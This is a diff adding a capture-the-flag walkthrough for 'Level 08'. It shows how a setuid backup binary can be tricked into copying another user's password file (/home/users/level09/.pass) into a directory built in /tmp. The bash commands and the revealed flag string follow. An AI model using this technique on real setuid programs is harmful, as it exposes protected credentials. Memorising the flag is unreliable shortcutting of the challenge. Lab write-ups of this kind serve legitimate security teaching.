@@ -1,1 +1,31 @@
+# Level 08 Walkthrough
 
+## Vulnerability
+The `level08` binary is a setuid program that backs up a file provided as an argument to a `./backups/` directory.
+It constructs the backup path by concatenating `./backups/` with the provided filename.
+It attempts to open the source file and the destination file.
+
+The vulnerability lies in the fact that it does not create the directory structure for the destination file. However, if we create the directory structure ourselves, we can trick it into writing to a location we control (or rather, a location it can write to, which we can then read).
+
+## Exploit
+1.  The target file is `/home/users/level09/.pass`.
+2.  The binary tries to write to `./backups/home/users/level09/.pass`.
+3.  We create this directory structure in a writable location (e.g., `/tmp`).
+4.  We run the binary from that location.
+
+```bash
+# Create the directory structure
+mkdir -p /tmp/my_exploit/backups/home/users/level09
+
+# Go to our exploit directory
+cd /tmp/my_exploit
+
+# Run the vulnerable binary with the absolute path to the password file
+/home/users/level08/level08 /home/users/level09/.pass
+
+# Read the backed-up password
+cat backups/home/users/level09/.pass
+```
+
+## Flag
+`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
